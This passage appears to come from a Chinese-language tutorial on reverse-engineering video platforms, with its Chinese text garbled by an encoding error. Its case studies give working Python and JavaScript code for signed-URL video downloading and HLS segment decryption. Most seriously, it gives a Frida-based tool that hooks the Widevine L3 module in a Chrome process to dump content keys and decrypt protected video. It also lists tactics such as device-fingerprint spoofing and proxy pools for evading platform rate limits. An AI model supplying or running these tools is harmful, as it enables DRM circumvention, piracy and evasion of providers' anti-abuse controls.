        return hashlib.md5(str_to_sign.encode()).hexdigest()[:12]

    def get_play_url(self, vid):
        &quot;&quot;&quot;è·å–æ’­æ”¾åœ°å€&quot;&quot;&quot;
        timestamp = int(time.time())
        sign = self.generate_sign(vid, timestamp)

        url = f&quot;{self.base_url}/video/play&quot;
        params = {
            'vid': vid,
            't': timestamp,
            'sign': sign
        }
        headers = {
            'Referer': f'{self.base_url}/watch/{vid}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        response = requests.get(url, params=params, headers=headers)
        data = response.json()

        if data['code'] == 0:
            return data['data']['url']
        else:
            raise Exception(f&quot;Failed to get play url: {data}&quot;)

    def download_video(self, vid, output_path):
        &quot;&quot;&quot;ä¸‹è½½è§†é¢‘&quot;&quot;&quot;
        play_url = self.get_play_url(vid)
        print(f&quot;Play URL: {play_url}&quot;)

        # ä¸‹è½½ M3U8 æˆ–ç›´æ¥è§†é¢‘
        response = requests.get(play_url, stream=True)
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

# ä½¿ç”¨ç¤ºä¾‹
downloader = VideoDownloader()
downloader.download_video('abc123', 'video.mp4')
</code></pre>
<h3>é˜²æŠ¤ä¸å¯¹æŠ—</h3>
<p><strong>é˜²æŠ¤æ–¹</strong>:</p>
<ul>
<li>å¯†é’¥å®šæœŸè½®æ¢</li>
<li>ä½¿ç”¨è®¾å¤‡æŒ‡çº¹ç»‘å®šç­¾å</li>
<li>æ·»åŠ æ’­æ”¾æ¬¡æ•°é™åˆ¶</li>
<li>IP é™é€Ÿå’Œé¢‘ç‡æ£€æµ‹</li>
</ul>
<p><strong>ç»•è¿‡æ–¹</strong>:</p>
<ul>
<li>å®æ—¶æå–æœ€æ–°å¯†é’¥ï¼ˆé€šè¿‡ Hookï¼‰</li>
<li>æ¨¡æ‹ŸçœŸå®æ’­æ”¾å™¨çš„è®¾å¤‡æŒ‡çº¹</li>
<li>ä½¿ç”¨ä»£ç†æ± åˆ†æ•£è¯·æ±‚</li>
</ul>
<hr />
<h2>æ¡ˆä¾‹ 2: M3U8/HLS æµè§£æä¸ä¸‹è½½</h2>
<h3>èƒŒæ™¯</h3>
<p>ä¸»æµè§†é¢‘å¹³å°ä½¿ç”¨ HLS (HTTP Live Streaming) åè®®ï¼Œè§†é¢‘è¢«åˆ‡åˆ†æˆå¤šä¸ª TS ç‰‡æ®µï¼Œé€šè¿‡ M3U8 ç´¢å¼•æ–‡ä»¶ç»„ç»‡ã€‚</p>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. M3U8 æ–‡ä»¶ç»“æ„</h4>
<p><strong>Master Playlist</strong> (å¤šç ç‡):</p>
<pre><code class="language-m3u8">#EXTM3U
#EXT-X-STREAM-INF:BANDWIDTH=1280000,RESOLUTION=1280x720
https://cdn.example.com/video/720p.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=2560000,RESOLUTION=1920x1080
https://cdn.example.com/video/1080p.m3u8
</code></pre>
<p><strong>Media Playlist</strong> (TS ç‰‡æ®µåˆ—è¡¨):</p>
<pre><code class="language-m3u8">#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXT-X-KEY:METHOD=AES-128,URI=&quot;https://cdn.example.com/key/abc123&quot;,IV=0x12345678901234567890123456789012
#EXTINF:10.0,
segment0.ts
#EXTINF:10.0,
segment1.ts
#EXTINF:10.0,
segment2.ts
#EXT-X-ENDLIST
</code></pre>
<h4>2. AES-128 åŠ å¯†è§£æ</h4>
<p>TS ç‰‡æ®µé€šå¸¸ä½¿ç”¨ AES-128-CBC åŠ å¯†ï¼Œéœ€è¦è·å–è§£å¯†å¯†é’¥:</p>
<pre><code class="language-javascript">// åœ¨æ’­æ”¾å™¨ä»£ç ä¸­æ‰¾åˆ°å¯†é’¥è·å–é€»è¾‘
function getDecryptionKey(keyUri) {
  return fetch(keyUri, {
    headers: {
      &quot;X-Key-Token&quot;: generateKeyToken(),
    },
  }).then((r) =&gt; r.arrayBuffer());
}

function generateKeyToken() {
  const timestamp = Date.now();
  const nonce = Math.random().toString(36);
  return btoa(timestamp + &quot;:&quot; + nonce);
}
</code></pre>
<h3>Python å®ç°</h3>
<pre><code class="language-python">import re
import os
import requests
from Crypto.Cipher import AES
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

class M3U8Downloader:
    def __init__(self, m3u8_url):
        self.m3u8_url = m3u8_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def parse_m3u8(self, content, base_url):
        &quot;&quot;&quot;è§£æ M3U8 æ–‡ä»¶&quot;&quot;&quot;
        lines = content.strip().split('\n')
        segments = []
        key_info = None

        for i, line in enumerate(lines):
            line = line.strip()

            # è§£æåŠ å¯†å¯†é’¥
            if line.startswith('#EXT-X-KEY'):
                match = re.search(r'METHOD=([^,]+),URI=&quot;([^&quot;]+)&quot;(?:,IV=(.+))?', line)
                if match:
                    method, uri, iv = match.groups()
                    key_url = urljoin(base_url, uri)
                    key_info = {
                        'method': method,
                        'uri': key_url,
                        'iv': iv
                    }

            # è§£æ TS ç‰‡æ®µ
            elif line.startswith('#EXTINF'):
                if i + 1 &lt; len(lines):
                    segment_url = urljoin(base_url, lines[i + 1].strip())
                    segments.append(segment_url)

        return segments, key_info

    def get_decryption_key(self, key_url):
        &quot;&quot;&quot;è·å–è§£å¯†å¯†é’¥&quot;&quot;&quot;
        # æ·»åŠ å¿…è¦çš„è¯·æ±‚å¤´
        import time
        import random
        import base64

        timestamp = int(time.time() * 1000)
        nonce = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        token = base64.b64encode(f&quot;{timestamp}:{nonce}&quot;.encode()).decode()

        headers = {'X-Key-Token': token}
        response = self.session.get(key_url, headers=headers)
        return response.content

    def decrypt_segment(self, encrypted_data, key, iv):
        &quot;&quot;&quot;è§£å¯† TS ç‰‡æ®µ&quot;&quot;&quot;
        if iv.startswith('0x'):
            iv_bytes = bytes.fromhex(iv[2:])
        else:
            iv_bytes = iv.encode()[:16].ljust(16, b'\0')

        cipher = AES.new(key, AES.MODE_CBC, iv_bytes)
        decrypted = cipher.decrypt(encrypted_data)

        # ç§»é™¤ PKCS7 å¡«å……
        padding_length = decrypted[-1]
        return decrypted[:-padding_length]

    def download_segment(self, url, index, key_info=None):
        &quot;&quot;&quot;ä¸‹è½½å¹¶è§£å¯†å•ä¸ªç‰‡æ®µ&quot;&quot;&quot;
        try:
            response = self.session.get(url, timeout=30)
            data = response.content

            # å¦‚æœæœ‰åŠ å¯†ï¼Œè¿›è¡Œè§£å¯†
            if key_info and key_info['method'] == 'AES-128':
                key = self.get_decryption_key(key_info['uri'])
                iv = key_info.get('iv', f'0x{index:032x}')
                data = self.decrypt_segment(data, key, iv)

            return index, data
        except Exception as e:
            print(f&quot;Failed to download segment {index}: {e}&quot;)
            return index, None

    def download(self, output_path, max_workers=10):
        &quot;&quot;&quot;ä¸‹è½½å®Œæ•´è§†é¢‘&quot;&quot;&quot;
        # è·å– M3U8 å†…å®¹
        response = self.session.get(self.m3u8_url)
        m3u8_content = response.text

        # æ£€æŸ¥æ˜¯å¦æ˜¯ Master Playlist
        if '#EXT-X-STREAM-INF' in m3u8_content:
            # é€‰æ‹©æœ€é«˜è´¨é‡
            lines = m3u8_content.strip().split('\n')
            for i, line in enumerate(lines):
                if line.startswith('#EXT-X-STREAM-INF'):
                    if i + 1 &lt; len(lines):
                        best_quality_url = urljoin(self.m3u8_url, lines[i + 1].strip())
                        response = self.session.get(best_quality_url)
                        m3u8_content = response.text
                        break

        # è§£æ M3U8
        base_url = self.m3u8_url.rsplit('/', 1)[0] + '/'
        segments, key_info = self.parse_m3u8(m3u8_content, base_url)

        print(f&quot;Found {len(segments)} segments&quot;)
        if key_info:
            print(f&quot;Encryption: {key_info['method']}&quot;)

        # å¹¶å‘ä¸‹è½½æ‰€æœ‰ç‰‡æ®µ
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(self.download_segment, url, i, key_info)
                for i, url in enumerate(segments)
            ]

            results = [future.result() for future in futures]

        # æŒ‰é¡ºåºåˆå¹¶ç‰‡æ®µ
        results.sort(key=lambda x: x[0])

        with open(output_path, 'wb') as f:
            for index, data in results:
                if data:
                    f.write(data)

        print(f&quot;Video saved to: {output_path}&quot;)

# ä½¿ç”¨ç¤ºä¾‹
downloader = M3U8Downloader('https://cdn.example.com/video/1080p.m3u8')
downloader.download('output.mp4', max_workers=20)
</code></pre>
<h3>é«˜çº§æŠ€å·§</h3>
<p><strong>1. å¤„ç†åŠ¨æ€ M3U8</strong>:
æŸäº›ç›´æ’­æµçš„ M3U8 ä¼šå®æ—¶æ›´æ–°ï¼Œéœ€è¦å¾ªç¯è·å–:</p>
<pre><code class="language-python">def download_live_stream(self, output_path, duration=3600):
    &quot;&quot;&quot;ä¸‹è½½ç›´æ’­æµï¼ˆæŒ‡å®šæ—¶é•¿ï¼‰&quot;&quot;&quot;
    downloaded_segments = set()
    start_time = time.time()

    with open(output_path, 'wb') as f:
        while time.time() - start_time &lt; duration:
            response = self.session.get(self.m3u8_url)
            segments, key_info = self.parse_m3u8(response.text, self.m3u8_url)

            for i, url in enumerate(segments):
                if url not in downloaded_segments:
                    _, data = self.download_segment(url, i, key_info)
                    if data:
                        f.write(data)
                        downloaded_segments.add(url)

            time.sleep(5)  # ç­‰å¾…æ–°ç‰‡æ®µ
</code></pre>
<p><strong>2. è§£æ MPEG-DASH</strong> (æ›¿ä»£ HLS):</p>
<pre><code class="language-python">from xml.etree import ElementTree as ET

def parse_mpd(mpd_url):
    &quot;&quot;&quot;è§£æ MPEG-DASH MPD æ–‡ä»¶&quot;&quot;&quot;
    response = requests.get(mpd_url)
    root = ET.fromstring(response.content)

    # æå–è§†é¢‘å’ŒéŸ³é¢‘æµ
    video_urls = []
    audio_urls = []

    for adaptation_set in root.findall('.//{urn:mpeg:dash:schema:mpd:2011}AdaptationSet'):
        content_type = adaptation_set.get('contentType')

        for representation in adaptation_set.findall('.//{urn:mpeg:dash:schema:mpd:2011}Representation'):
            base_url = representation.find('.//{urn:mpeg:dash:schema:mpd:2011}BaseURL').text

            if content_type == 'video':
                video_urls.append(base_url)
            elif content_type == 'audio':
                audio_urls.append(base_url)

    return video_urls, audio_urls
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 3: DRM ä¿æŠ¤åˆ†æ (Widevine)</h2>
<h3>èƒŒæ™¯</h3>
<p>Netflixã€Disney+ ç­‰å¹³å°ä½¿ç”¨ Widevine DRM ä¿æŠ¤è§†é¢‘å†…å®¹ã€‚æœ¬æ¡ˆä¾‹åˆ†æ Widevine L3 çº§åˆ«çš„å·¥ä½œåŸç†ã€‚</p>
<h3>Widevine å·¥ä½œæµç¨‹</h3>
<h4>EME (Encrypted Media Extensions) + Widevine å®Œæ•´æµç¨‹</h4>
<pre><code class="language-mermaid">sequenceDiagram
    participant Player as ç½‘é¡µæ’­æ”¾å™¨&lt;br/&gt;(JavaScript)
    participant Browser as æµè§ˆå™¨&lt;br/&gt;(EME API)
    participant CDM as Widevine CDM&lt;br/&gt;(Content Decryption Module)
    participant License as License æœåŠ¡å™¨
    participant CDN as CDN&lt;br/&gt;(åŠ å¯†è§†é¢‘)

    Note over Player,CDN: é˜¶æ®µ 1: åˆå§‹åŒ–æ’­æ”¾

    Player-&gt;&gt;CDN: è¯·æ±‚è§†é¢‘æ–‡ä»¶ (DASH/HLS)
    CDN--&gt;&gt;Player: è¿”å› Manifest (MPD/M3U8)
    Note over Player: è§£æ Manifest&lt;br/&gt;å‘ç°åŠ å¯†ä¿¡æ¯ (PSSH)

    Player-&gt;&gt;Browser: new MediaKeys()
    Browser-&gt;&gt;CDM: åˆ›å»º CDM å®ä¾‹
    CDM--&gt;&gt;Browser: CDM åˆå§‹åŒ–å®Œæˆ
    Browser--&gt;&gt;Player: MediaKeys å¯¹è±¡

    Player-&gt;&gt;Browser: video.setMediaKeys(mediaKeys)
    Note over Browser: å°† CDM ç»‘å®šåˆ° video å…ƒç´ 

    Note over Player,CDN: é˜¶æ®µ 2: License è¯·æ±‚

    Player-&gt;&gt;Browser: session.generateRequest(initDataType, initData)
    Note over Browser: initData åŒ…å« PSSH&lt;br/&gt;(Protection System Specific Header)

    Browser-&gt;&gt;CDM: ç”Ÿæˆ License Request
    activate CDM
    Note over CDM: æ„å»º License Request:&lt;br/&gt;- è®¾å¤‡ ID&lt;br/&gt;- å®‰å…¨çº§åˆ« (L1/L3)&lt;br/&gt;- Client Capabilities
    CDM--&gt;&gt;Browser: License Request (Protobuf äºŒè¿›åˆ¶)
    deactivate CDM

    Browser--&gt;&gt;Player: message äº‹ä»¶ (License Request)

    Player-&gt;&gt;License: POST /license&lt;br/&gt;Content-Type: application/octet-stream&lt;br/&gt;[License Request äºŒè¿›åˆ¶æ•°æ®]
    Note over License: éªŒè¯è¯·æ±‚:&lt;br/&gt;1. è®¾å¤‡åˆæ³•æ€§&lt;br/&gt;2. ç”¨æˆ·æƒé™&lt;br/&gt;3. è®¢é˜…çŠ¶æ€&lt;br/&gt;4. åœ°åŒºé™åˆ¶

    Note over Player,CDN: é˜¶æ®µ 3: License å“åº”

    License-&gt;&gt;License: ç”Ÿæˆ Content Keys&lt;br/&gt;(KID + Key)
    Note over License: ä½¿ç”¨è®¾å¤‡å…¬é’¥åŠ å¯† Keys

    License--&gt;&gt;Player: License Response (Protobuf äºŒè¿›åˆ¶)

    Player-&gt;&gt;Browser: session.update(response)
    Browser-&gt;&gt;CDM: å¤„ç† License Response
    activate CDM
    Note over CDM: 1. ä½¿ç”¨è®¾å¤‡ç§é’¥è§£å¯†&lt;br/&gt;2. æå– Content Keys&lt;br/&gt;3. å­˜å‚¨åˆ°å®‰å…¨å­˜å‚¨
    CDM--&gt;&gt;Browser: Keys å®‰è£…å®Œæˆ
    deactivate CDM

    Note over Player,CDN: é˜¶æ®µ 4: è§†é¢‘æ’­æ”¾

    Player-&gt;&gt;CDN: è¯·æ±‚åŠ å¯†è§†é¢‘ç‰‡æ®µ
    CDN--&gt;&gt;Player: åŠ å¯†çš„è§†é¢‘æ•°æ®

    Player-&gt;&gt;Browser: video.play()
    Browser-&gt;&gt;CDM: è¯·æ±‚è§£å¯†è§†é¢‘æ•°æ®
    activate CDM
    Note over CDM: ä½¿ç”¨ Content Key&lt;br/&gt;è§£å¯†è§†é¢‘å¸§&lt;br/&gt;(AES-128-CTR/CBC)
    CDM--&gt;&gt;Browser: è§£å¯†åçš„è§†é¢‘å¸§
    deactivate CDM

    Browser-&gt;&gt;Browser: æ¸²æŸ“è§†é¢‘å¸§åˆ° &lt;video&gt;

    Note over Player,CDN: æ’­æ”¾ä¸­...
</code></pre>
<h4>DRM å®‰å…¨çº§åˆ«å¯¹æ¯”</h4>
<pre><code class="language-mermaid">graph TB
    subgraph Widevine[&quot;Widevine å®‰å…¨çº§åˆ«&quot;]
        L1[L1 - ç¡¬ä»¶çº§å®‰å…¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è§£å¯†åœ¨ TEE ä¸­è¿›è¡Œ&lt;br/&gt;â€¢ å¯†é’¥å­˜å‚¨åœ¨ç¡¬ä»¶&lt;br/&gt;â€¢ è§†é¢‘æ•°æ®ä¸ç»è¿‡ä¸» CPU&lt;br/&gt;â€¢ æœ€é«˜å®‰å…¨æ€§]
        L2[L2 - è½¯ä»¶åŠ å¯†, ç¡¬ä»¶è§†é¢‘&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è§£å¯†åœ¨è½¯ä»¶ä¸­&lt;br/&gt;â€¢ è§†é¢‘å¤„ç†åœ¨ç¡¬ä»¶&lt;br/&gt;â€¢ ä¸­ç­‰å®‰å…¨æ€§]
        L3[L3 - çº¯è½¯ä»¶&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å®Œå…¨åœ¨è½¯ä»¶ä¸­è¿è¡Œ&lt;br/&gt;â€¢ å¯†é’¥å¯è¢«æå–&lt;br/&gt;â€¢ æœ€ä½å®‰å…¨æ€§&lt;br/&gt;â€¢ å¸¸è§äºæµè§ˆå™¨]
    end

    subgraph Security[&quot;å®‰å…¨æ€§ â†“&quot;]
        High[é«˜å®‰å…¨&lt;br/&gt;4K/HDR]
        Medium[ä¸­ç­‰å®‰å…¨&lt;br/&gt;1080p]
        Low[ä½å®‰å…¨&lt;br/&gt;720p/480p]
    end

    L1 --&gt; High
    L2 --&gt; Medium
    L3 --&gt; Low

    subgraph Attack[&quot;é€†å‘éš¾åº¦ â†“&quot;]
        Hard[æéš¾æ”»ç ´&lt;br/&gt;éœ€è¦ç¡¬ä»¶æ¼æ´]
        Moderate[è¾ƒéš¾&lt;br/&gt;éœ€è¦ç³»ç»Ÿçº§æƒé™]
        Easy[ç›¸å¯¹å®¹æ˜“&lt;br/&gt;å†…å­˜æ‰«æ/Hook]
    end

    L1 --&gt; Hard
    L2 --&gt; Moderate
    L3 --&gt; Easy

    style L1 fill:#51cf66
    style L2 fill:#ffd43b
    style L3 fill:#ff6b6b
    style High fill:#51cf66
    style Medium fill:#ffd43b
    style Low fill:#ff6b6b
    style Hard fill:#51cf66
    style Moderate fill:#ffd43b
    style Easy fill:#ff6b6b
</code></pre>
<h4>Widevine L3 å¯†é’¥æå–æµç¨‹</h4>
<pre><code class="language-mermaid">flowchart TD
    Start[å¼€å§‹é€†å‘] --&gt; Identify{è¯†åˆ« DRM ç±»å‹}

    Identify --&gt;|Widevine| CheckLevel{æ£€æŸ¥å®‰å…¨çº§åˆ«}
    Identify --&gt;|PlayReady| Other1[å…¶ä»– DRM&lt;br/&gt;æµç¨‹ç±»ä¼¼]
    Identify --&gt;|FairPlay| Other2[Apple è®¾å¤‡ä¸“ç”¨]

    CheckLevel --&gt;|L1| L1Block[âŒ L1 çº§åˆ«&lt;br/&gt;ç¡¬ä»¶åŠ å¯†&lt;br/&gt;æ— æ³•æå–]
    CheckLevel --&gt;|L2| L2Block[âš ï¸ L2 çº§åˆ«&lt;br/&gt;éœ€è¦ root/è¶Šç‹±&lt;br/&gt;éš¾åº¦è¾ƒé«˜]
    CheckLevel --&gt;|L3| L3Continue[âœ… L3 çº§åˆ«&lt;br/&gt;å¯ä»¥ç»§ç»­]

    L3Continue --&gt; Method{é€‰æ‹©æå–æ–¹æ³•}

    Method --&gt;|æ–¹æ³• 1| Frida1[Frida Hook&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Method --&gt;|æ–¹æ³• 2| Memory[å†…å­˜æ‰«æ&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Method --&gt;|æ–¹æ³• 3| Proxy[ä»£ç†æ‹¦æˆª&lt;br/&gt;â”â”â”â”â”â”â”â”]

    Frida1 --&gt; FridaSteps[1. é™„åŠ åˆ°æµè§ˆå™¨è¿›ç¨‹&lt;br/&gt;2. Hook CDM å‡½æ•°&lt;br/&gt;3. æ‹¦æˆª DecryptCTR/CBC&lt;br/&gt;4. å¯¼å‡º Key]

    Memory --&gt; MemSteps[1. æš‚åœè§†é¢‘æ’­æ”¾&lt;br/&gt;2. æ‰«æè¿›ç¨‹å†…å­˜&lt;br/&gt;3. æœç´¢ 16 å­—èŠ‚ AES Key&lt;br/&gt;4. éªŒè¯å¯†é’¥]

    Proxy --&gt; ProxySteps[1. Hook MediaKeySession&lt;br/&gt;2. æ‹¦æˆª update äº‹ä»¶&lt;br/&gt;3. è§£æ License Response&lt;br/&gt;4. æå–åŠ å¯†çš„ Keys]

    FridaSteps --&gt; Decrypt[ä½¿ç”¨æå–çš„å¯†é’¥&lt;br/&gt;è§£å¯†è§†é¢‘]
    MemSteps --&gt; Decrypt
    ProxySteps --&gt; Decrypt

    Decrypt --&gt; Tools[è§£å¯†å·¥å…·:&lt;br/&gt;â€¢ mp4decrypt&lt;br/&gt;â€¢ ffmpeg&lt;br/&gt;â€¢ shaka-packager]

    Tools --&gt; Output[âœ… æ˜æ–‡è§†é¢‘è¾“å‡º]

    L1Block --&gt; End[æ— æ³•ç»§ç»­]
    L2Block --&gt; End
    Other1 --&gt; End
    Other2 --&gt; End

    style L1Block fill:#ff6b6b
    style L2Block fill:#ffd43b
    style L3Continue fill:#51cf66
    style Output fill:#51cf66
    style End fill:#868e96
</code></pre>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ License è¯·æ±‚</h4>
<pre><code class="language-python"># License Request
POST /widevine/license HTTP/1.1
Host: license.example.com
Content-Type: application/octet-stream

[Binary Protobuf Data: License Request]
</code></pre>
<p><strong>License Request ç»“æ„</strong> (Protobuf):</p>
<pre><code class="language-protobuf">message LicenseRequest {
    ClientIdentification client_id = 1;
    ContentIdentification content_id = 2;
    bytes encrypted_client_id = 3;
}
</code></pre>
<h4>2. JavaScript Hook æ‹¦æˆª</h4>
<pre><code class="language-javascript">// Hook MediaKeySession
(function () {
  const originalGenerateRequest = MediaKeySession.prototype.generateRequest;

  MediaKeySession.prototype.generateRequest = function (
    initDataType,
    initData
  ) {
    console.log(&quot;=== License Request ===&quot;);
    console.log(&quot;Init Data Type:&quot;, initDataType);
    console.log(&quot;Init Data:&quot;, new Uint8Array(initData));

    // æ‹¦æˆª PSSH (Protection System Specific Header)
    const pssh = new Uint8Array(initData);
    console.log(
      &quot;PSSH:&quot;,
      Array.from(pssh)
        .map((b) =&gt; b.toString(16).padStart(2, &quot;0&quot;))
        .join(&quot; &quot;)
    );

    return originalGenerateRequest.call(this, initDataType, initData);
  };

  const originalUpdate = MediaKeySession.prototype.update;

  MediaKeySession.prototype.update = function (response) {
    console.log(&quot;=== License Response ===&quot;);
    console.log(&quot;Response:&quot;, new Uint8Array(response));

    return originalUpdate.call(this, response);
  };
})();
</code></pre>
<h4>3. Frida Hook Native CDM</h4>
<p>å¯¹äº L3 çº§åˆ«ï¼ŒContent Decryption Module åœ¨æµè§ˆå™¨è¿›ç¨‹ä¸­è¿è¡Œ:</p>
<pre><code class="language-javascript">// Frida script to hook Widevine CDM
Interceptor.attach(
  Module.findExportByName(&quot;widevinecdm.dll&quot;, &quot;DecryptAndDecode&quot;),
  {
    onEnter: function (args) {
      console.log(&quot;DecryptAndDecode called&quot;);
      console.log(&quot;Encrypted buffer:&quot;, args[0]);
      console.log(&quot;Buffer size:&quot;, args[1].toInt32());
    },
    onLeave: function (retval) {
      console.log(&quot;Decrypted successfully:&quot;, retval);
    },
  }
);
</code></pre>
<h3>L3 å¯†é’¥æå–å·¥å…·</h3>
<pre><code class="language-python">import frida
import sys

class WidevineL3Extractor:
    def __init__(self):
        self.keys = []

    def on_message(self, message, data):
        &quot;&quot;&quot;å¤„ç† Frida æ¶ˆæ¯&quot;&quot;&quot;
        if message['type'] == 'send':
            payload = message['payload']
            if 'key' in payload:
                print(f&quot;Found key: {payload['key']}&quot;)
                self.keys.append(payload)

    def extract_keys(self, process_name='chrome.exe'):
        &quot;&quot;&quot;ä»æµè§ˆå™¨è¿›ç¨‹æå–å¯†é’¥&quot;&quot;&quot;
        session = frida.attach(process_name)

        script_code = &quot;&quot;&quot;
        // Hook Widevine OEMCrypto functions
        var oemcrypto = Process.findModuleByName('widevinecdm.dll');

        if (oemcrypto) {
            var decrypt_func = oemcrypto.findExportByName('OEMCrypto_DecryptCTR');

            Interceptor.attach(decrypt_func, {
                onEnter: function(args) {
                    // args[2] is the key
                    var key = args[2];
                    var keyBuffer = Memory.readByteArray(key, 16);

                    send({
                        'type': 'key',
                        'key': Array.from(new Uint8Array(keyBuffer)).map(b =&gt;
                            b.toString(16).padStart(2, '0')
                        ).join('')
                    });
                }
            });
        }
        &quot;&quot;&quot;

        script = session.create_script(script_code)
        script.on('message', self.on_message)
        script.load()

        print(&quot;Waiting for keys... (play some DRM content)&quot;)
        sys.stdin.read()

        return self.keys

# ä½¿ç”¨ç¤ºä¾‹
extractor = WidevineL3Extractor()
keys = extractor.extract_keys('chrome.exe')

# ä½¿ç”¨æå–çš„å¯†é’¥è§£å¯†è§†é¢‘
for key_info in keys:
    print(f&quot;KID: {key_info.get('kid', 'N/A')}&quot;)
    print(f&quot;Key: {key_info['key']}&quot;)
</code></pre>
<h3>ä½¿ç”¨å¯†é’¥è§£å¯†è§†é¢‘</h3>
<pre><code class="language-python">from Crypto.Cipher import AES

def decrypt_video_with_key(encrypted_file, output_file, key_hex, iv_hex=None):
    &quot;&quot;&quot;ä½¿ç”¨æå–çš„å¯†é’¥è§£å¯†è§†é¢‘&quot;&quot;&quot;
    key = bytes.fromhex(key_hex)

    if iv_hex:
        iv = bytes.fromhex(iv_hex)
    else:
        # é»˜è®¤ IV (å…¨ 0)
        iv = b'\x00' * 16

    cipher = AES.new(key, AES.MODE_CTR, nonce=iv[:8], initial_value=int.from_bytes(iv[8:], 'big'))

    with open(encrypted_file, 'rb') as f_in:
        with open(output_file, 'wb') as f_out:
            while True:
                chunk = f_in.read(64 * 1024)
                if not chunk:
                    break
                decrypted_chunk = cipher.decrypt(chunk)
                f_out.write(decrypted_chunk)

# ä½¿ç”¨ç¤ºä¾‹
decrypt_video_with_key(
    'encrypted_video.mp4',
    'decrypted_video.mp4',
    key_hex='0123456789abcdef0123456789abcdef'
)
</code></pre>
<h3>æ³¨æ„äº‹é¡¹</h3>
<ul>
<li><strong>L1 vs L3</strong>: L1 çº§åˆ«çš„å¯†é’¥å­˜å‚¨åœ¨ç¡¬ä»¶å®‰å…¨æ¨¡å—ä¸­ï¼Œæ— æ³•ç›´æ¥æå–</li>
<li><strong>æ³•å¾‹é£é™©</strong>: ç»•è¿‡ DRM å¯èƒ½è¿å DMCA ç­‰æ³•å¾‹</li>
<li><strong>ä»…ç”¨äºç ”ç©¶</strong>: æœ¬æ¡ˆä¾‹ä»…ç”¨äºæ•™è‚²ç›®çš„</li>
</ul>
<hr />
<h2>æ¡ˆä¾‹ 4: è§†é¢‘æ¸…æ™°åº¦é€‰æ‹©ç®—æ³•é€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>è§†é¢‘å¹³å°æ ¹æ®ç½‘ç»œçŠ¶å†µè‡ªåŠ¨è°ƒæ•´è§†é¢‘æ¸…æ™°åº¦ã€‚é€†å‘è¿™ä¸ªç®—æ³•å¯ä»¥å¼ºåˆ¶æ’­æ”¾æœ€é«˜è´¨é‡è§†é¢‘ã€‚</p>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. å®šä½ ABR (Adaptive Bitrate) é€»è¾‘</h4>
<p>åœ¨æ’­æ”¾å™¨ä»£ç ä¸­æœç´¢ <code>bandwidth</code>ã€<code>quality</code>ã€<code>resolution</code>:</p>
<pre><code class="language-javascript">class AdaptiveBitrateController {
  constructor() {
    this.currentLevel = 0;
    this.levels = [
      { width: 640, height: 360, bitrate: 800000 },
      { width: 1280, height: 720, bitrate: 2500000 },
      { width: 1920, height: 1080, bitrate: 5000000 },
      { width: 3840, height: 2160, bitrate: 15000000 },
    ];
  }

  selectLevel(bandwidth, bufferLevel) {
    /**
     * é€‰æ‹©ç®—æ³•:
     * 1. å¦‚æœç¼“å†²åŒºä½äº 5 ç§’ï¼Œé™ä½è´¨é‡
     * 2. å¦‚æœå¸¦å®½ &gt; æ¯”ç‰¹ç‡ * 1.5ï¼Œå¯ä»¥å‡çº§
     * 3. è€ƒè™‘åˆ‡æ¢æˆæœ¬ï¼ˆé¿å…é¢‘ç¹åˆ‡æ¢ï¼‰
     */

    if (bufferLevel &lt; 5) {
      // ç¼“å†²åŒºä¸è¶³ï¼Œé™çº§
      return Math.max(0, this.currentLevel - 1);
    }

    // æ‰¾åˆ°æœ€é«˜å¯ç”¨è´¨é‡
    for (let i = this.levels.length - 1; i &gt;= 0; i--) {
      if (bandwidth &gt;= this.levels[i].bitrate * 1.5) {
        // é¿å…é¢‘ç¹åˆ‡æ¢
        if (Math.abs(i - this.currentLevel) &lt;= 1) {
          return i;
        }
      }
    }

    return this.currentLevel;
  }

  measureBandwidth() {
    /**
     * å¸¦å®½æµ‹é‡:
     * ä½¿ç”¨æœ€è¿‘ä¸‹è½½ç‰‡æ®µçš„é€Ÿåº¦ä¼°ç®—
     */
    const recentDownloads = this.downloadHistory.slice(-5);
    const totalBytes = recentDownloads.reduce((sum, d) =&gt; sum + d.bytes, 0);
    const totalTime = recentDownloads.reduce((sum, d) =&gt; sum + d.duration, 0);

    return (totalBytes * 8) / totalTime; // bps
  }
}
</code></pre>
<h4>2. Hook å¼ºåˆ¶æœ€é«˜è´¨é‡</h4>
<pre><code class="language-javascript">// æ–¹æ³• 1: è¦†ç›– selectLevel æ–¹æ³•
(function () {
  const originalSelectLevel = AdaptiveBitrateController.prototype.selectLevel;

  AdaptiveBitrateController.prototype.selectLevel = function (
    bandwidth,
    bufferLevel
  ) {
    // æ€»æ˜¯è¿”å›æœ€é«˜è´¨é‡ç´¢å¼•
    return this.levels.length - 1;
  };

  console.log(&quot;Forced highest quality&quot;);
})();

// æ–¹æ³• 2: ä¿®æ”¹å¸¦å®½æµ‹é‡ç»“æœ
(function () {
  const originalMeasureBandwidth =
    AdaptiveBitrateController.prototype.measureBandwidth;

  AdaptiveBitrateController.prototype.measureBandwidth = function () {
    // è¿”å›ä¸€ä¸ªå¾ˆå¤§çš„å¸¦å®½å€¼
    return 100000000; // 100 Mbps
  };
})();
</code></pre>
<h4>3. Tampermonkey ç”¨æˆ·è„šæœ¬</h4>
<pre><code class="language-javascript">// ==UserScript==
// @name         Force Highest Video Quality
// @namespace    http://tampermonkey.net/
// @version      1.0
